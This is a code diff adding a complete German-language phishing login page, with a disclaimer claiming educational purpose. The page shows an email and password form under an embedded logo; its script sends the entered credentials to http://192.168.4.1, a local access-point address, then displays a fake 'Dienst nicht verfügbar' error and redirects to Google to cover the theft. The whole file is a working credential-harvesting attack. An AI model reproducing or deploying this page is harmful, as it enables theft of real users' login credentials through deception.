@@ -1,0 +1,103 @@
+<!-- 
+Disclaimer
+
+Educational Use and Legal Framework
+
+The phishing pages provided here are strictly intended for educational and training purposes. The goal is to raise awareness about security threats and teach users how to protect themselves against phishing attacks. By accessing these pages, you agree to use them only within a legal and ethical framework, in compliance with the laws and regulations applicable in your jurisdiction.
+
+Limitation of Liability
+
+The author of this page disclaims any responsibility for the malicious or illegal use of these phishing pages. Any person using these pages for purposes not in accordance with the law will be solely responsible for their actions. It is strongly recommended to never use these techniques for any purpose other than learning and awareness. The author does not monitor the use of these pages post-download and transfers all responsibility to the user upon download.
+-->
+<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <title>Anmeldeseite</title>
+    <style>
+body {
+    font-family: 'Arial', sans-serif;
+    background-color: #f4f4f4;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    margin: 0;
+}
+
+.login-form {
+    background-color: white;
+    padding: 20px;
+    border-radius: 8px;
+    box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+}
+
+.login-image {
+    width: 100%;
+    height: 150px; /* Hauteur fixe pour l'image */
+    background-image: url(' data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAABkCAMAAABHPGVmAAAAIGNIUk0AAHomAACAhAAA+gAAAIDoAAB1MAAA6mAAADqYAAAXcJy6UTwAAAHgUExURThYlzpYmDpYlTlYlzpXlDpYlDtXlTlWlzpXlTpYmDpYlzpYlzpYlzpZmDpYlzpYlzpZmTpYmDpYlzpYlzpYmDpYlzpYlzpYlzlXljhXljhWljdWljdWlTdVlTlXlztZl0Jfm0tnoFVvpV53qmZ+rmyCsW+Fs3CGtGyDsWh/r2R7rV12qkRgnDlYlz9dmlZwpnaLt5moybfC2c7W5d/k7urt9PHz+PX3+vj5+/n6/Pr6/Pb4+vT2+e3v9W6EsjtZmFlyp4+gxMXO4Ons8/v8/f///3OItWF5rK661Ont9Pv7/Upln56tzFt0qcnR4tne61BqotHY5z1bma261HWKtvb3+kZinc3U5ICUvENfnMnR46a00P7+/v39/nSJtUhkn9je6rjD2Y2ew4OVvX6Ru3+Su4aYv5ChxJqqyvX2+vL0+GmAsEdjnuXp8XeMt7XB2Ozv9URhnNPZ6P7+/5Wlx1JtpOfr8uPn8FFso2N7rfP1+b7I3TxamHOJtaWz0IKVvY6fw4mbwZamx4GUvJuqynqPuZ2sy/z8/Z2szPr7/HKHtDRTlJyryzNSlE1poYCTvMHL3qSyz09qomuCse7w9l93qmB4q152qrC81fr7/Yudwl93q0VhnTVUlDVTlHCFs4KuBE0AAAAXdFJOUwAAAAAAAAAAAC2L1PYIa9wICIj6a92JcbA4uAAAAAFiS0dERY6zqFcAAAAHdElNRQfnDBYWGgtIQ5hJAAACgklEQVRo3u3a6VMTMRgG8AQV6GGhlLJHmkVFqqgonlCkLWijiHiLogKi9awngvdRtF71PsHbf1UEO0O2Q6eJ+/JB83ze5De7k9l3dudBCOMSl9vj1QDi9bhdJRjPmTDm+yoghKlU+CoxRthfFYAzNC1QVYnR3GpQY0KpnodcQVhD04Iu5IY2NM2NPPCIB4GcXT5eBG9omkL+YUQ3TBKilIYIMS0AxKCkdsHCRXWL68NLwksbli1f0egwYpKVq5pWr1m7bv2G5pZIa6RlY1s0FnIUMePtHZs2JxiXxBbqIKJrWzu3sbx0OYmY27ujjMEi5o6djAEjZt0uBo0Yu/cwcGTvPgaOkP094Ih14CADR0hvAhyxDh1m4Aipb4ZH9CMzAX19jPUPOIFYRwfzt28bPNZ9PHni5KnTZ9oNBxDScNZOpDrPnY+bdDLEkaFFO+zGhYvxvK3/Eqm9ZDMuh0mh62UQa+gKbwyPGAUXyCDG1Ws8cv2G8wi5eYtHbt8pvEAGoXe7eOSeCYCkh3lkhBZeIIWM2g7XfQjkge1wZQAQ8pBH+h9BII955EkTBPLU9mofmAUk+8wxxKK5PH/BI62xl5SLLovor14n01PJvOGRxNve9LQkM+90SYSGI6zIZKXHrwAiP+MVohCF/F9ItlhE/o9E6H00lYv9nnpSXD6EZf+tNA59HPuT8U+88fnL+Nj0fP1mSSKaZeby3Ta0IrEfJhcnPh3s4zfycxZmvEIUohCFKEQhClGIQhSikJkQiSKGKOKVqZSIIh6Zcowo4pap+QgiQRcq9QkXlsSQgK8UYX+NqCKEBGr8eLJEJvjERJCgz48xKsO4XLAOVzTyuw5XjnHZL0WJJtCSMo5IAAAAJXRFWHRkYXRlOmNyZWF0ZQAyMDIzLTEyLTIyVDIyOjI2OjA1KzAwOjAw8dPUZgAAACV0RVh0ZGF0ZTptb2RpZnkAMjAyMy0xMi0yMlQyMjoyNjowNSswMDowMICObNoAAAAodEVYdGRhdGU6dGltZXN0YW1wADIwMjMtMTItMjJUMjI6MjY6MTErMDA6MDDvfmmIAAAAAElFTkSuQmCC'); /* Remplacez ... par votre image en base64 */
+    background-repeat: no-repeat;
+    background-position: center;
+    background-size: 100px 100px; /* Taille fixe de l'image */
+    border-top-left-radius: 8px;
+    border-top-right-radius: 8px;
+}
+
+.form-control {
+    width: 100%;
+    padding: 10px;
+    margin-bottom: 10px;
+    border: 1px solid #ddd;
+    border-radius: 4px;
+    box-sizing: border-box;
+	text-align:center;
+}
+
+.form-control:focus {
+    border-color: #0056b3;
+    outline: none;
+}
+
+.btn {
+    width: 100%;
+    padding: 10px;
+    border: none;
+    border-radius: 4px;
+    background-color: #007bff;
+    color: white;
+    cursor: pointer;
+    transition: background-color 0.3s;
+}
+
+.btn:hover {
+    background-color: #0056b3;
+}
+
+    </style>
+</head>
+<body>
+    <div class="login-form">
+        <div class="login-image"></div>
+        <input type="email" id="email" class="form-control" placeholder="Email">
+        <input type="password" id="password" class="form-control" placeholder="Password">
+        <button onclick="sendCredentials()" class="btn">Verbinden</button>
+    </div>
+
+    <script>
+        function sendCredentials() {
+            var email = document.getElementById('email').value;
+            var password = document.getElementById('password').value;
+            
+            getFile("http://192.168.4.1/?email=" + encodeURIComponent(email) + "&password=" + encodeURIComponent(password));
+			alert("Dienst nicht verfügbar.");
+            window.location.href = "https://www.google.com";
+        }
+
+        function getFile(url) {
+            var xhr = new XMLHttpRequest();
+            xhr.open("GET", url, true);
+            xhr.send();
+        }
+    </script>
+</body>
+</html>
